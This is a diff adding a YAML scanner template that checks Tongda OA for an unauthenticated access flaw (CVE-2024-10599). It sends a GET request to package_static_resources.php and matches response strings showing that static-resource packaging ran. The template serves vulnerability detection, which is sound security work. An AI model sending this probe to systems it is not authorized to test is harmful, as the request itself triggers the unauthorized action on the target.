@@ -1,0 +1,29 @@
+id: poc-yaml-tongda-oa-resources-package
+info:
+  name: 通达OA package_static_resources.php 未授权访问(CVE-2024-10599)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 两高一弱,认证绕过,CVE-2024-10599
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/inc/package_static_resources.php'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'contains(gbk_decode(body), "读取")'
+          - 'contains(gbk_decode(body), "/static/mobile")'
+          - 'contains(gbk_decode(body), "写入")'
+          - 'contains(gbk_decode(body), ".js<br>")'
+          - 'contains(gbk_decode(body), ".css<br>")'
+          - 'contains(gbk_decode(body), "打包成功")'
+          - 'contains(body, "读取")'
+          - 'contains(body, "/static/mobile")'
+          - 'contains(body, "写入")'
+          - 'contains(body, ".js<br>")'
+          - 'contains(body, ".css<br>")'
+          - 'contains(body, "打包成功")'
